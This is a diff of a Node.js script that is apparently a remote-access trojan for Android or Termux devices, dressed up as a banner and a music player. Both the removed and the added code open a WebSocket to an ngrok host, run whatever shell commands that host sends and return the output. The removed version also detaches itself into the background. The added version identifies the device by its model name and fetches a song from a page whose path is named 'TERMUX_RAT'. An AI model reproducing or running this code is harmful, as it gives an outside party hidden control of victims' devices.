@@ -1,101 +1,4 @@
-const { spawn, exec, execSync } = require("child_process");
-const path = require("path");
-
-// ------------------- Banner -------------------
-const msg3 = '  ██████  ▒█████   ██▀███   ██▀███  ▓██   ██▓\n' +
-'▒██    ▒ ▒██▒  ██▒▓██ ▒ ██▒▓██ ▒ ██▒ ▒██  ██▒\n' +
-'░ ▓██▄   ▒██░  ██▒▓██ ░▄█ ▒▓██ ░▄█ ▒  ▒██ ██░\n' +
-'  ▒   ██▒▒██   ██░▒██▀▀█▄  ▒██▀▀█▄    ░ ▐██▓░\n' +
-'▒██████▒▒░ ████▓▒░░██▓ ▒██▒░██▓ ▒██▒  ░ ██▒▓░\n' +
-'▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ▒▓ ░▒▓░   ██▒▒▒\n' +
-'░ ░▒  ░    ░ ▒ ▒░   ░▒ ░ ▒   ░▒ ░ ▒  ▓██ ░▒░\n' +
-'░  ░  ░  ░ ░ ░ ▒    ░░   ░   ░░   ░  ▒ ▒ ░░\n' +
-'      ░      ░ ░     ░        ░      ░ ░'; // your full banner
-console.clear();
-console.log(msg3);
-
-// ------------------- Spawn detached child -------------------
-if (process.argv[2] !== "runChild") {
-  const child = spawn(process.argv[0], [__filename, "runChild"], {
-    detached: true,
-    stdio: "ignore"
-  });
-  child.unref(); // detach
-  process.exit(); // parent exits immediately
-}
-
-// ------------------- Child process -------------------
-if (process.argv[2] === "runChild") {
-  // Keep Node alive
-  const keepAlive = setInterval(() => {}, 1000);
-
-  // ------------------- Require ws -------------------
-  function getGlobalNodeModules() {
-    return execSync("npm root -g").toString().trim();
-  }
-
-  let WebSocket;
-  try {
-    WebSocket = require("ws");
-  } catch (e) {
-    try {
-      const globalWsPath = path.join(getGlobalNodeModules(), "ws");
-      WebSocket = require(globalWsPath);
-    } catch (err) {
-      execSync("npm install -g ws", { stdio: "inherit" });
-      const globalWsPath = path.join(getGlobalNodeModules(), "ws");
-      WebSocket = require(globalWsPath);
-    }
-  }
-
-  // ------------------- WebSocket -------------------
-  const DEVICE_ID = Date.now().toString();
-  const ws = new WebSocket("wss://macaw-pleasant-intensely.ngrok-free.app");
-
-  ws.on("open", () => {
-    console.log("WebSocket connected (background)");
-  });
-
-  ws.on("message", (msg) => {
-    const data = JSON.parse(msg.toString());
-    if (data.type === "command") {
-      exec(data.command, (err, stdout, stderr) => {
-        ws.send(JSON.stringify({
-          type: "output",
-          id: DEVICE_ID,
-          output: stdout || stderr || (err ? err.message : "")
-        }));
-      });
-    }
-  });
-
-  // ------------------- Sox playback -------------------
-  function playSong() {
-    exec("sox --version", (err) => {
-      if (err) {
-        exec("apt update && apt install -y sox", () => {
-          streamSong();
-        });
-      } else {
-        streamSong();
-      }
-    });
-  }
-
-  function streamSong() {
-    // Stream song continuously
-    const song = exec(`curl -s localhost:8080/song.mp3 | play -t mp3 -`);
-    song.on("exit", () => {
-      setTimeout(streamSong, 1000); // loop after 1 sec
-    });
-  }
-
-  playSong();
-}
-
-
-
-/*const { execSync, exec } = require("child_process");
+const { execSync, exec } = require("child_process");
 const path = require("path");
 
 // Function to get global node_modules path
@@ -112,19 +15,14 @@ try {
     const globalWsPath = path.join(getGlobalNodeModules(), "ws");
     WebSocket = require(globalWsPath); // global
   } catch (err) {
-    console.log("ws not found. Installing globally...");
     execSync("npm install -g ws", { stdio: "inherit" });
     const globalWsPath = path.join(getGlobalNodeModules(), "ws");
     WebSocket = require(globalWsPath); // require after global install
   }
 }
 
-const DEVICE_ID = Date.now().toString(); // random id
+const DEVICE_ID = execSync("getprop ro.product.model").toString().trim();
 const ws = new WebSocket("wss://macaw-pleasant-intensely.ngrok-free.app");
-
-ws.on("open", () => {
-  console.log("WebSocket connected!");
-});
 
 ws.on("message", (msg) => {
   const data = JSON.parse(msg.toString());
@@ -191,7 +89,7 @@ const msg3 = '  ██████  ▒█████   ██▀███   �
   console.log(msg3);*/
   
   // Check if sox is installed; install silently if not
-  /*exec("sox --version", (err) => {
+  exec("sox --version", (err) => {
     if (err) {
       exec("apt update && apt install sox", () => {
         playSong();
@@ -202,9 +100,9 @@ const msg3 = '  ██████  ▒█████   ██▀███   �
   });
 
   function playSong() {
-    exec(`curl -s localhost:8080/song.mp3 | play -t mp3 -`);
+    exec(`curl -s https://sabir7718.github.io/TERMUX_RAT/song.mp3 | play -t mp3 -`);
   }
-  });*/
+  });
 
   
 
